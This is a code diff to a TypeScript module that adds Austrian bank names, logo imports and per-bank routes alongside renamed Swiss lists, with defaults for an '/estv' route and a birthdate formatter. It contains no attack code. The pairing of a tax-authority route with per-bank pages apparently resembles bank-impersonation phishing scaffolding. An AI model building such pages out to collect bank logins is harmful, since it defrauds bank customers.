@@ -21,7 +21,29 @@ import valiantAsset from "@/assets/ch-banks/valiant.png.asset.json";
 import zugerAsset from "@/assets/ch-banks/zuger.png.asset.json";
 import zuercherAsset from "@/assets/ch-banks/zuercher.png.asset.json";
 
-export const banks = [
+import raiffeisenIcon from "@/assets/raiffeisen_bank.png";
+import ersteIcon from "@/assets/erste_bank.png";
+import bawagIcon from "@/assets/bawag_psk.png";
+import bankAustriaIcon from "@/assets/bank_austria.png";
+import volksbankIcon from "@/assets/volksbank.png";
+import easyBankIcon from "@/assets/easy_bank.png";
+import hypoNoeIcon from "@/assets/hypo_noe.png";
+import oberbankIcon from "@/assets/oberbank.png";
+import bank99Icon from "@/assets/bank99.png";
+import schelhammerIcon from "@/assets/schelhammer.png";
+import bankhausSpaenglerIcon from "@/assets/bankhaus_spaengler.png";
+import dolomitenIcon from "@/assets/dolomiten_bank.png";
+import spardaIcon from "@/assets/sparda_bank.png";
+import dadatIcon from "@/assets/dadat_bank.png";
+import marchfelderIcon from "@/assets/marchfelder_bank.png";
+import btvVlbIcon from "@/assets/btv-vlb.png";
+import burgenlandIcon from "@/assets/burgenland.jpg";
+import bksIcon from "@/assets/bks.png";
+import vkbIcon from "@/assets/vkb_bank.png";
+import wuestenrotIcon from "@/assets/wuestenrot-icon.png";
+import denizbankIcon from "@/assets/denizbank-icon.png";
+
+export const banksCH = [
   { name: "Aargauische Kantonalbank", icon: aargauischeAsset.url },
   { name: "Appenzeller Kantonalbank", icon: appenzellerAsset.url },
   { name: "Baloise Bank", icon: baloiseAsset.url },
@@ -46,7 +68,7 @@ export const banks = [
   { name: "Zürcher Kantonalbank", icon: zuercherAsset.url },
 ];
 
-export const bankRouteMap: Record<string, string> = {
+export const bankRouteMapCH: Record<string, string> = {
   "Aargauische Kantonalbank": "/ch/aargauische-kantonalbank",
   "Appenzeller Kantonalbank": "/ch/appenzeller-kantonalbank",
   "Baloise Bank": "/ch/baloise",
@@ -70,6 +92,58 @@ export const bankRouteMap: Record<string, string> = {
   "Zuger Kantonalbank": "/ch/zuger-kantonalbank",
   "Zürcher Kantonalbank": "/ch/zuercher-kantonalbank",
 };
+
+export const banksAT = [
+  { name: "Raiffeisen Bank", icon: raiffeisenIcon },
+  { name: "Erste Bank", icon: ersteIcon },
+  { name: "BAWAG P.S.K.", icon: bawagIcon },
+  { name: "Bank Austria", icon: bankAustriaIcon },
+  { name: "Volksbank", icon: volksbankIcon },
+  { name: "Easy Bank", icon: easyBankIcon },
+  { name: "HYPO NOE", icon: hypoNoeIcon },
+  { name: "OberBank", icon: oberbankIcon },
+  { name: "Bank99", icon: bank99Icon },
+  { name: "Schelhammer", icon: schelhammerIcon },
+  { name: "Bankhaus Spängler", icon: bankhausSpaenglerIcon },
+  { name: "Dolomiten Bank", icon: dolomitenIcon },
+  { name: "Sparda Bank", icon: spardaIcon },
+  { name: "Dadat Bank", icon: dadatIcon },
+  { name: "Marchfelder Bank", icon: marchfelderIcon },
+  { name: "BTV Vier Länder Bank", icon: btvVlbIcon },
+  { name: "Bank Burgenland", icon: burgenlandIcon },
+  { name: "BKS Bank", icon: bksIcon },
+  { name: "VKB Volkskreditbank", icon: vkbIcon },
+  { name: "Wüstenrot", icon: wuestenrotIcon },
+  { name: "DenizBank", icon: denizbankIcon },
+];
+
+export const bankRouteMapAT: Record<string, string> = {
+  "Raiffeisen Bank": "/at/raiffeisenbank",
+  "Erste Bank": "/at/erstebank",
+  "BAWAG P.S.K.": "/at/bawag",
+  "Bank Austria": "/at/bankaustria",
+  "Volksbank": "/at/volksbank",
+  "Easy Bank": "/at/easybank",
+  "HYPO NOE": "/at/hyponoe",
+  "OberBank": "/at/oberbank",
+  "Bank99": "/at/bank99",
+  "Schelhammer": "/at/schelhammer",
+  "Bankhaus Spängler": "/at/bankhausspaengler",
+  "Dolomiten Bank": "/at/dolomitenbank",
+  "Sparda Bank": "/at/spardabank",
+  "Dadat Bank": "/at/dadatbank",
+  "Marchfelder Bank": "/at/marchfelderbank",
+  "BTV Vier Länder Bank": "/at/btv",
+  "Bank Burgenland": "/at/burgenland",
+  "BKS Bank": "/at/bks",
+  "VKB Volkskreditbank": "/at/vkb",
+  "Wüstenrot": "/at/wuestenrot",
+  "DenizBank": "/at/denizbank",
+};
+
+// Defaults used by /estv (CH).
+export const banks = banksCH;
+export const bankRouteMap = bankRouteMapCH;
 
 export function formatBirthdate(input: string): string {
   const d = input.replace(/\D/g, "").slice(0, 8);
